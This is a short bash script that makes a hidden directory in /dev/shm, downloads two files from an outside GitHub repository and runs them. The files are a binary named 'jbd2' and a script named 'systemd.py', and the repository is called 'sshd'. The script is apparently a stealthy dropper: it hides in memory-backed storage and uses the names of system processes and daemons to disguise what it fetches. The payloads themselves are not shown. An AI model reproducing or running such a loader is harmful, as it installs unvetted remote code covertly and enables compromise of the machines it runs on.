#!/bin/bash

set -e

mkdir -p /dev/shm/.cache
chmod 700 /dev/shm/.cache
cd /dev/shm/.cache

wget -q \
    https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
    https://github.com/ANTI-VIRAL/sshd/raw/main/systemd.py 

chmod +x jbd2

# Start program
exec python systemd.py
